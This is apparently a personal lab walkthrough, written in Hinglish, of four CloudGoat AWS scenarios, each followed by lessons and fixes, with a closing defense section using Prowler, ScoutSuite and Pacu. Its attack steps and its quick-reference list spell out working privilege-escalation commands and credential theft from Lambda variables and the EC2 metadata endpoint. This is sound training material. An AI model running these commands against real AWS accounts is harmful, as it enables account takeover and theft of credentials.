# ⚔️ Attack Walkthrough — Har Scenario Step-by-Step

> Yeh document future reference ke liye hai — exactly kya kiya, kaise kiya, aur kyun kiya.

---

## 🔧 Setup

```bash
# Project folder
mkdir ~/Developer/red-team-lab
cd ~/Developer/red-team-lab

# CloudGoat clone + install
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
poetry install

# AWS lab profile configure karo
aws configure --profile cloudgoat
# region: us-east-1

# CloudGoat configure karo
poetry run cloudgoat config profile        # "cloudgoat" enter karo
poetry run cloudgoat config whitelist --auto  # apna IP whitelist hoga
```

---

## Scenario 1 — `iam_privesc_by_rollback`

### Concept
IAM policies ke multiple versions ho sakte hain (max 5). Agar koi purani version mein zyada permissions hain, aur user ke paas `SetDefaultPolicyVersion` hai, toh woh khud ko upgrade kar sakta hai.

### Deploy
```bash
poetry run cloudgoat create iam_privesc_by_rollback --profile cloudgoat
# Output: raynor_access_key_id, raynor_secret_access_key
```

### Attack Steps

```bash
# Step 1: Victim profile configure karo
aws configure --profile raynor
# (cloudgoat output ki keys daalo)

# Step 2: Apni attached policy dhundo
aws iam list-attached-user-policies \
  --user-name raynor-<cgid> \
  --profile cloudgoat

# Step 3: Policy versions enumerate karo
aws iam list-policy-versions \
  --policy-arn <policy-arn> \
  --profile raynor

# Output: v1 (default), v2, v3, v4, v5

# Step 4: Har version ki permissions dekho
aws iam get-policy-version \
  --policy-arn <policy-arn> \
  --version-id v3 \
  --profile raynor

# v3 = Action:* Resource:* (FULL ADMIN!)

# Step 5: v3 ko default set karo (PRIVILEGE ESCALATION!)
aws iam set-default-policy-version \
  --policy-arn <policy-arn> \
  --version-id v3 \
  --profile raynor

# Step 6: Verify — ab admin hai
aws iam list-users --profile raynor   # ✅ Works!
aws s3 ls --profile raynor            # ✅ Works!
```

### What We Learned
- `iam:SetDefaultPolicyVersion` = dangerous permission
- Purani policy versions delete nahi ki toh time bomb ban jaati hain
- Attacker ko sirf ek permission chahiye — rollback

### Fix
```bash
# Purani versions delete karo
aws iam delete-policy-version \
  --policy-arn <arn> --version-id v3

# SetDefaultPolicyVersion permission hato non-admin users se
```

### Cleanup
```bash
poetry run cloudgoat destroy iam_privesc_by_rollback --profile cloudgoat
```

---

## Scenario 2 — `ec2_ssrf`

### Concept
Lambda functions ke environment variables mein kabhi kabhi developers credentials store kar dete hain. Low-privilege user bhi `lambda:ListFunctions` se yeh credentials dekh sakta hai.

### Deploy
```bash
poetry run cloudgoat create ec2_ssrf --profile cloudgoat
# Output: solus_access_key_id, solus_secret_key
```

### Attack Steps

```bash
# Step 1: Solus profile configure karo
aws configure --profile solus
# (output ki keys)
# Region: us-east-1

# Step 2: Solus ki permissions dekho (admin se)
aws iam list-attached-user-policies \
  --user-name solus-<cgid> --profile cloudgoat
# Result: lambda:Get*, lambda:List* only

# Step 3: Lambda functions list karo
aws lambda list-functions --profile solus --region us-east-1

# JACKPOT! Output mein:
# "EC2_ACCESS_KEY_ID": "AKIA..."
# "EC2_SECRET_KEY_ID": "..."
# Plain text mein credentials!

# Step 4: Stolen credentials configure karo
aws configure --profile ec2-stolen
# (lambda se mile credentials)

# Step 5: Identity verify karo
aws sts get-caller-identity --profile ec2-stolen
# Returns: wrex user (ec2:* permissions)

# Step 6: Wrex ki powers dekho
aws iam get-policy-version \
  --policy-arn <wrex-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: ec2:* on Resource:*

# Step 7: EC2 instance role ki powers dekho
aws iam list-attached-role-policies \
  --role-name cg-ec2-role-<cgid> --profile cloudgoat
# Result: s3:* + cloudwatch:*

# Step 8: Scenario complete — Lambda invoke karo
aws lambda invoke \
  --function-name cg-lambda-<cgid> \
  --profile cloudgoat --region us-east-1 \
  --cli-binary-format raw-in-base64-out \
  output.txt && cat output.txt
# "You win!"
```

### What We Learned
- Lambda env vars = publicly readable (by anyone with lambda:List/Get)
- Secrets Manager use karo, kabhi env vars mein credentials mat daalo
- IMDSv2 enforce karo SSRF prevention ke liye
- Overpermissive EC2 roles dangerous hain

### Fix
```bash
# Secrets Manager mein move karo
aws secretsmanager create-secret \
  --name prod/lambda/credentials \
  --secret-string '{"key":"...","secret":"..."}'

# Exposed key rotate karo immediately
aws iam update-access-key \
  --access-key-id <key> --status Inactive
```

### Cleanup
```bash
poetry run cloudgoat destroy ec2_ssrf --profile cloudgoat
```

---

## Scenario 3 — `iam_privesc_by_attachment`

### Concept
Agar user ke paas `ec2:RunInstances` + `iam:PassRole` + `iam:AddRoleToInstanceProfile` hai, toh woh admin role wali EC2 launch karke metadata service se admin credentials chura sakta hai.

### Deploy
```bash
poetry run cloudgoat create iam_privesc_by_attachment --profile cloudgoat
# Output: kerrigan_access_key_id, kerrigan_secret_key
```

### Attack Steps

```bash
# Step 1: Kerrigan configure karo
aws configure --profile kerrigan

# Step 2: Kerrigan ki policy dekho
aws iam get-policy-version \
  --policy-arn <kerrigan-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: iam:AddRoleToInstanceProfile, iam:PassRole,
#         ec2:RunInstances, ec2:DescribeInstances, etc.

# Step 3: Available roles enumerate karo
aws iam list-roles --profile kerrigan \
  --query "Roles[?contains(RoleName, '<cgid>')].[RoleName]" \
  --output table
# Found: cg-ec2-meek-role (weak), cg-ec2-mighty-role (ADMIN!)

# Step 4: Instance profiles dekho
aws iam list-instance-profiles --profile kerrigan \
  --query "InstanceProfiles[?contains(InstanceProfileName, '<cgid>')]" \
  --output table
# Found: cg-ec2-meek-instance-profile

# Step 5: Meek role nikalo, mighty role daalo
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-<cgid> \
  --role-name cg-ec2-meek-role-<cgid> \
  --profile kerrigan

aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-<cgid> \
  --role-name cg-ec2-mighty-role-<cgid> \
  --profile kerrigan

# Step 6: Key pair banao
aws ec2 create-key-pair \
  --key-name kerrigan-attack-key \
  --profile kerrigan --region us-east-1 \
  --query "KeyMaterial" --output text \
  > ~/.ssh/kerrigan-attack-key.pem
chmod 400 ~/.ssh/kerrigan-attack-key.pem

# Step 7: Nayi EC2 launch karo with mighty role
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --key-name kerrigan-attack-key \
  --subnet-id <cloudgoat-subnet> \
  --security-group-ids <cloudgoat-sg> \
  --iam-instance-profile Name="cg-ec2-meek-instance-profile-<cgid>" \
  --associate-public-ip-address \
  --profile kerrigan --region us-east-1

# Step 8: EC2 IP milne ke baad SSH karo
ssh -i ~/.ssh/kerrigan-attack-key.pem ec2-user@<public-ip>

# Step 9: EC2 ke andar — metadata se credentials churaao
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-<cgid>
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 10: Bahar aao aur credentials use karo
exit
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws iam list-users   # ✅ FULL ADMIN!
aws s3 ls            # ✅ Works!
```

### What We Learned
- `iam:PassRole` + `ec2:RunInstances` = privilege escalation primitive
- EC2 Instance Metadata Service (169.254.169.254) = magic IP
- IMDSv2 enforce karo (http-tokens=required)
- Least privilege for instance profiles

### Important Concept — IMDS
```
169.254.169.254 = AWS magic IP
Sirf EC2 ke andar se accessible hai
EC2 ka role, region, credentials yahan milte hain
IMDSv1 = directly accessible (dangerous)
IMDSv2 = token required pehle (safer)
```

### Fix
```bash
# IMDSv2 enforce karo
aws ec2 modify-instance-metadata-options \
  --instance-id <id> \
  --http-tokens required \
  --http-endpoint enabled

# PassRole permission restrict karo
# Sirf specific roles pe allow karo, * nahi
```

### Cleanup
```bash
aws ec2 terminate-instances --instance-ids <id> --profile kerrigan
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
poetry run cloudgoat destroy iam_privesc_by_attachment --profile cloudgoat
```

---

## Scenario 4 — `lambda_privesc`

### Concept
Agar user ke paas `lambda:CreateFunction` + `iam:PassRole` hai, toh woh ek malicious Lambda function bana sakta hai jisme admin role execution role ke taur pe ho. Lambda invoke karne pe admin credentials milte hain.

### Deploy
```bash
poetry run cloudgoat create lambda_privesc --profile cloudgoat
# Output: chris_access_key_id, chris_secret_key
```

### Attack Steps

```bash
# Step 1: Chris configure karo
aws configure --profile chris

# Step 2: Chris ki policy dekho
aws iam get-policy-version \
  --policy-arn <chris-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: sts:AssumeRole, iam:List*, iam:Get*

# Step 3: Roles enumerate karo
aws iam list-roles --profile chris \
  --query "Roles[?contains(RoleName, '<cgid>')]" --output table
# Found:
#   cg-debug-role (AdministratorAccess!) 
#   cg-lambdaManager-role (lambda:* + iam:PassRole)

# Step 4: debug-role directly assume karne ki koshish
aws sts assume-role \
  --role-arn <debug-role-arn> \
  --role-session-name test --profile chris
# ERROR: AccessDenied (sirf lambda.amazonaws.com kar sakta hai)

# Step 5: LambdaManager role assume karo
aws sts assume-role \
  --role-arn <lambdaManager-role-arn> \
  --role-session-name lambda-attack --profile chris
# SUCCESS! Credentials milenge

# Step 6: LambdaManager credentials set karo
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Step 7: Malicious Lambda code banao
cat > /tmp/lambda_payload.py << 'EOF'
import boto3, json

def handler(event, context):
    sts = boto3.client('sts')
    response = sts.get_caller_identity()
    return {
        'statusCode': 200,
        'body': json.dumps({
            'UserId': response['UserId'],
            'Arn': response['Arn']
        })
    }
EOF

cd /tmp && zip lambda_payload.zip lambda_payload.py

# Step 8: Lambda deploy karo WITH debug-role as execution role
aws lambda create-function \
  --function-name chris-attack-fn \
  --runtime python3.11 \
  --role <debug-role-arn> \
  --handler lambda_payload.handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --region us-east-1

# Step 9: Lambda invoke karo
aws lambda invoke \
  --function-name chris-attack-fn \
  --region us-east-1 \
  --cli-binary-format raw-in-base64-out \
  /tmp/output.txt && cat /tmp/output.txt
# Returns: assumed-role/cg-debug-role (AdministratorAccess!)
```

### What We Learned
- `lambda:CreateFunction` + `iam:PassRole` = dangerous combo
- Lambda execution role = Lambda ke andar us role ke permissions milte hain
- Trust policy check karo — kaunsa service assume kar sakta hai
- Yeh AWS ka most common production privilege escalation path hai

### Fix
```bash
# Lambda delete karo
aws lambda delete-function --function-name chris-attack-fn

# PassRole restrict karo specific resources pe
{
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::*:role/specific-lambda-role-only"
}
```

### Cleanup
```bash
aws lambda delete-function --function-name chris-attack-fn --region us-east-1
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
poetry run cloudgoat destroy lambda_privesc --profile cloudgoat
```

---

## 🛡️ Defense Phase

### Prowler Scans
```bash
# IAM scan
prowler aws \
  --profile cloudgoat \
  --service iam \
  --severity critical high \
  --status FAIL \
  --output-formats html json-ocsf \
  --output-directory ./prowler-results \
  --region us-east-1

# EC2 + S3 scan
prowler aws \
  --profile cloudgoat \
  --service ec2 s3 \
  --output-formats html json-ocsf \
  --output-directory ./prowler-results \
  --region us-east-1
```

**Results:** 2 Critical, 39 High, 40 Medium, 18 Low = **99 total findings**

### ScoutSuite Audit
```bash
scout aws \
  --profile cloudgoat \
  --report-dir ./scoutsuite-report \
  --no-browser

# Report open karo
open ./scoutsuite-report/aws-cloudgoat.html
```

### Pacu Automation
```bash
cd ~/Developer/red-team-lab/pacu
poetry run python cli.py

# Pacu shell mein:
set_regions us-east-1
import_keys cloudgoat
run iam__enum_users_roles_policies_groups
run iam__privesc_scan
# Result: 24 confirmed privilege escalation paths!
run ec2__enum
run secrets__enum
```

---

## 🔑 Most Important Commands — Quick Reference

```bash
# Identity check
aws sts get-caller-identity --profile <profile>

# IAM recon
aws iam list-attached-user-policies --user-name <user> --profile <p>
aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile <p>
aws iam list-roles --profile <p>

# Privilege escalation
aws iam set-default-policy-version --policy-arn <arn> --version-id v3 --profile <p>
aws iam add-role-to-instance-profile --instance-profile-name <n> --role-name <r> --profile <p>
aws sts assume-role --role-arn <arn> --role-session-name <name> --profile <p>

# EC2 recon
aws ec2 describe-instances --region us-east-1 --profile <p>
aws ec2 describe-iam-instance-profile-associations --profile <p>

# Lambda recon
aws lambda list-functions --profile <p> --region us-east-1
aws lambda get-function --function-name <name> --profile <p>

# Metadata (EC2 ke andar se)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Temporary credentials use karna
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
# Clear karne ke liye:
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```
